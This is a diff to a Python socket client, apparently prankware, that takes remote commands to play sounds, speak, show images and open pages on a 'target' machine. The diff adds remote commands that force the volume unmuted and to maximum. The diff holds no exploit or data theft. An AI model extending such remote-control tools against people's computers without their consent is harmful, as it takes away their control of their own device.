@@ -13,16 +13,30 @@ from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 
 pygame.mixer.init()
-
 ASSETS_DIR = os.path.join(os.path.dirname(__file__), "assets")
 
-def set_max_volume():
+def get_volume_interface():
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    if volume.GetMute():
-        volume.SetMute(0, None)
-    volume.SetMasterVolumeLevelScalar(0.3, None)
+    return cast(interface, POINTER(IAudioEndpointVolume))
+
+def set_max_volume():
+    volume = get_volume_interface()
+    volume.SetMute(0, None)
+    volume.SetMasterVolumeLevelScalar(1.0, None)
+
+def set_half_volume():
+    volume = get_volume_interface()
+    volume.SetMute(0, None)
+    volume.SetMasterVolumeLevelScalar(0.5, None)
+
+def mute_volume():
+    volume = get_volume_interface()
+    volume.SetMute(1, None)
+
+def unmute_volume():
+    volume = get_volume_interface()
+    volume.SetMute(0, None)
 
 def play_sound(name):
     filepath = os.path.join(ASSETS_DIR, "sounds", f"{name}.mp3")
@@ -40,7 +54,6 @@ def show_emolio_on_target():
         if not emolio_images_list:
             print("❌ Aucun fichier Emolio trouvé.")
             return
-
         filename = random.choice(emolio_images_list)
         filepath = os.path.join(emolio_dir, filename)
 
@@ -89,8 +102,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             print(f"📥 Commande reçue : {data}")
 
             if data.startswith("sound:"):
-                sound_name = data.split("sound:")[1]
-                play_sound(sound_name)
+                play_sound(data.split("sound:")[1])
 
             elif data.startswith("speak:"):
                 text = data.split("speak:")[1]
@@ -117,3 +129,19 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
             elif data == "work":
                 open_work_html_on_target()
+
+            elif data.startswith("volume:set:"):
+                try:
+                    level = float(data.split("volume:set:")[1])
+                    volume = get_volume_interface()
+                    volume.SetMute(0, None)
+                    volume.SetMasterVolumeLevelScalar(level, None)
+                    print(f"🔊 Volume réglé à {int(level * 100)}%")
+                except Exception as e:
+                    print(f"❌ Erreur réglage volume : {e}")
+
+            elif data == "volume:mute":
+                mute_volume()
+
+            elif data == "volume:unmute":
+                unmute_volume()
